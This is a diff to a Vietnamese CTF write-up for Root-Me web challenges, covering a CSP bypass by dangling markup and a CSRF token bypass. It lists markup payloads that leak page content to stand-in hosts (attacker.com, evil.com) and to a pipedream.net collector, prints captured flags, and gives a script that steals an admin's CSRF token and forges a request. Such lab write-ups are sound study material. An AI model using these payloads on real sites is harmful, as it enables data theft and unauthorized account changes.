@@ -221,5 +221,44 @@ flag:
 flag=rootme{XSS_D0M_BaSed_InTr0}
 
 ```
+## 19. CSP Bypass - Dangling markup
+- Đây là lỗi có thể thoát khỏi thẻ để chèn thẻ HTML
+- Tham khảo payload ở
+https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection#stealing-clear-text-secrets
+- Ở đây có thể sử dụng cả 3 payload này đều được
+```js
+<img src='http://attacker.com/log.php?HTML=
+<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
+<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
+```
+- Payload
+```js
+http://challenge01.root-me.org:58029/page?user=%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%270;URL=https://eoesrmo2qdh1ls6.m.pipedream.net?
 
+https://eoesrmo2qdh1ls6.m.pipedream.net/? !</h1>  <div class="message">        <p>At Quackquack corp the developers think that they do not have to patch XSS because they implement the Content Security Policy (CSP). But you are a hacker, right ? I am sure you will be able to exfiltrate this flag: 
+D4NGL1NG_M4RKUP_W1TH_FIREF0X_EASY. (Only the bot is able to see the flag :
+```
+## 21. CSRF - token bypass
+- Bài này khi đăng nhập sẽ có trường input token mặc định bị ẩn thường token sẽ được ramdom cho mỗi user.
+- Đăng kí rồi đăng nhập vô với helo/helo
+- Bài này cũng giống như bài CSRF trước nhưng có thêm cần phải có token của admin.
+- Gửi cho admin cái form lấy token rồi submit cái status của tài khoản helo là thành công
+- Comment
+```js
+<form name="csrf" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" method="post" enctype="multipart/form-data"> 
+    <input id="username" type="text" name="username" value="helo">
+    <input id="status" type="checkbox" name="status" value="on" checked>
+    <input id="admin-token" type="hidden" name="token" value="" /> 
+</form> 
+<script> 
+    var request = new XMLHttpRequest(); request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false); 
+    request.send(null); 
+    var respone = request.responseText; 
+    var token_group = respone.match("token\" value=\"(.*?)\""); 
+    var token = token_group[1]; 
+    document.getElementById("admin-token").value = token; 
+    document.csrf.submit(); 
+</script>
+```
 
+![Screenshot 2022-05-29 012556](https://i.imgur.com/K9P9TwX.png)
